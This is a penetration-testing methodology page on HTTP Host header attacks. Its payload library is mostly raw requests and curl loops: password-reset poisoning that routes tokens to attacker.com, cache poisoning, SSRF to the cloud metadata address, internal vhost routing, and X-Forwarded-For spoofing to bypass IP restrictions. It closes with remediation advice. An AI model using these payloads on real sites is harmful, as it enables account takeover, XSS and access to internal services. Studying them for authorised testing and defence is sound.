---
title: "Host Header Attacks"
date: 2026-02-24
draft: false
---

# Host Header Attacks

> **Severity**: High–Critical | **CWE**: CWE-20, CWE-601
> **OWASP**: A05:2021 – Security Misconfiguration

---

## What Are Host Header Attacks?

The HTTP `Host` header tells the server which virtual host to serve. Applications that trust `Host` blindly for link generation, password reset emails, routing, or cache keying are vulnerable. Manipulation leads to: password reset poisoning, cache poisoning, SSRF, routing bypass, and XSS.

```
GET /reset-password?token=abc123 HTTP/1.1
Host: attacker.com             ← injected

App sends email: "Click: https://attacker.com/reset?token=abc123"
Victim clicks → attacker receives token → account takeover
```

---

## Discovery Checklist

- [ ] Modify `Host:` to an attacker-controlled domain — check if reflected in response/emails
- [ ] Test `X-Forwarded-Host:`, `X-Host:`, `X-Forwarded-Server:`, `X-HTTP-Host-Override:`
- [ ] Test with port appended: `Host: target.com:evil.com`
- [ ] Test password reset flow with poisoned Host header
- [ ] Check if Host is used to generate absolute URLs in HTML/JSON responses
- [ ] Test cache poisoning via unkeyed Host header
- [ ] Test with duplicate `Host:` headers
- [ ] Test absolute-form request URI with different Host header
- [ ] Test routing bypass to internal services via Host manipulation
- [ ] Test `X-Forwarded-For` + `X-Real-IP` for IP-based auth bypass
- [ ] Check for SSRF via Host header (internal service routing)

---

## Payload Library

### Attack 1 — Password Reset Poisoning

```bash
# Step 1: Request password reset for victim account
# Step 2: Intercept request, modify Host header to attacker-controlled domain

POST /forgot-password HTTP/1.1
Host: attacker.com            ← poisoned
Content-Type: application/x-www-form-urlencoded

email=victim@corp.com

# App generates: https://attacker.com/reset?token=VICTIM_TOKEN
# Victim receives email, clicks link → token delivered to attacker.com
# Attacker uses token to reset victim's password

# Alternative override headers to test:
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com    ← many frameworks prefer this

POST /forgot-password HTTP/1.1
Host: target.com
X-Host: attacker.com

POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Server: attacker.com

# Via port injection — Host: target.com:@attacker.com
# Some parsers treat :@ as userinfo separator
Host: target.com:@attacker.com
```

### Attack 2 — Web Cache Poisoning via Host Header

```bash
# If cache key doesn't include Host header (unkeyed header):
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# App generates response with:
# <script src="https://attacker.com/app.js"></script>
# Cache stores this under the key for target.com/
# All subsequent users get the poisoned response (XSS)

# Or via Host header directly if cache doesn't normalize:
GET / HTTP/1.1
Host: attacker.com

# Check if X-Cache: HIT on second request → cached with poisoned Host
curl -s -I https://target.com/ -H "X-Forwarded-Host: attacker.com" | grep -i "x-cache\|location"
```

### Attack 3 — Routing to Internal Services

```bash
# Virtual host routing — different Host routes to different backend:
# Normal: Host: target.com → public app
# Internal: Host: internal.admin → admin panel

GET /admin HTTP/1.1
Host: internal.admin
# If proxy routes by Host header and doesn't enforce allowlist:
# → May access internal admin panel

# Try common internal Host values:
Host: localhost
Host: 127.0.0.1
Host: internal
Host: admin
Host: admin.target.com
Host: internal.target.com
Host: staging.target.com
Host: dev.target.com

# Absolute request URI bypass:
GET http://internal.service/admin HTTP/1.1
Host: target.com
# The absolute URI takes precedence over Host in some proxies
```

### Attack 4 — Duplicate Host Header

```bash
# Some servers use first Host, some use last, some concatenate:
GET / HTTP/1.1
Host: target.com
Host: attacker.com

# Test which value is reflected in response or used for routing
# WAF may check first, app may use second

# Host header with double value (inline):
Host: target.com, attacker.com
Host: target.com attacker.com    # space-separated
```

### Attack 5 — SSRF via Host Header

```bash
# If server uses Host header to make server-side requests:
GET / HTTP/1.1
Host: 169.254.169.254            # AWS metadata

GET / HTTP/1.1
Host: internal-api:8080          # internal service

GET / HTTP/1.1
Host: collaborator.oast.pro      # OOB detection

# With port manipulation:
Host: target.com:80@169.254.169.254  # userinfo injection
```

### Attack 6 — X-Forwarded-For IP Bypass

```bash
# Bypass IP-based restrictions (admin panel requires 127.0.0.1):
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

GET /admin HTTP/1.1
Host: target.com
X-Real-IP: 127.0.0.1

GET /admin HTTP/1.1
Host: target.com
X-Originating-IP: 127.0.0.1

GET /admin HTTP/1.1
Host: target.com
Client-IP: 127.0.0.1

GET /admin HTTP/1.1
Host: target.com
True-Client-IP: 127.0.0.1

GET /admin HTTP/1.1
Host: target.com
Forwarded: for=127.0.0.1;by=127.0.0.1;host=target.com

# Bypass rate limits — change IP per request:
X-Forwarded-For: 1.2.3.4    # rotate through IPs
X-Forwarded-For: 10.0.0.1
```

---

## Tools

```bash
# Burp Suite:
# - Proxy → all requests → add/modify Host header
# - Repeater for manual testing
# - Param Miner extension (BApp): discovers unkeyed headers including Host variants
# - Active Scan for Host header injection

# Param Miner (Burp extension):
# Right-click request → Extensions → Param Miner → Guess Headers
# Automatically discovers reflected/unkeyed headers

# curl with custom Host:
curl -s -H "Host: attacker.com" https://target.com/ | grep -i "attacker"
curl -s -H "X-Forwarded-Host: attacker.com" https://target.com/ | grep -i "attacker"

# Check password reset email generation:
# Use Burp Collaborator as Host value, trigger password reset,
# check Collaborator for incoming DNS/HTTP (confirms Host is used in email)

# Test all override headers at once:
for header in "X-Forwarded-Host" "X-Host" "X-HTTP-Host-Override" \
              "X-Forwarded-Server" "X-Original-Host"; do
  echo "Testing: $header"
  curl -s -H "$header: attacker.oast.pro" https://target.com/ | \
    grep -i "attacker" | head -2
done

# Collaborator-based detection:
# Set Host to your Collaborator ID, trigger various actions,
# monitor for DNS/HTTP callbacks
```

---

## Remediation Reference

- **Hardcode the expected hostname**: configure web framework with `ALLOWED_HOSTS` (Django), `server_name` (Nginx), `ServerName` (Apache) — reject any other Host value
- **Never trust `X-Forwarded-Host`** for URL generation unless behind a known trusted proxy
- **Generate absolute URLs from configuration**, not from the request's Host header
- **Cache key discipline**: ensure Host (and override headers) are either in cache key or stripped before caching
- **IP allowlist enforcement**: don't rely solely on `X-Forwarded-For` for IP-based access control — verify at network layer
- **Password reset links**: use relative paths or server-configured base URL — never construct from Host header

*Part of the Web Application Penetration Testing Methodology series.*
